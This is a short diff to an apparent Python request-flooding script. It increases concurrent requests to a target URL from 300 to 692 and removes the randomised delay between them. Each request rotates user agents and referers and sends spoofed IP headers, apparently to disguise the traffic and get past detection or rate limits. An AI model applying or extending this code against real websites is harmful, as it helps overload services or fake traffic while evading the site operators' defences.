@@ -112,13 +112,12 @@ def main():
 
     with ThreadPoolExecutor(max_workers=20) as executor:
         futures = []
-        for _ in range(300):
+        for _ in range(692):
             user_agent = get_random_user_agent()
             referer = get_random_referer()
             headers, ip_spoofed = generate_headers(user_agent, referer, cookies)
             futures.append(executor.submit(make_request, url, headers, request_count, ip_spoofed))
             request_count += 1
-            time.sleep(random.uniform(0.6, 1.7))
 
         for future in as_completed(futures):
             future.result()
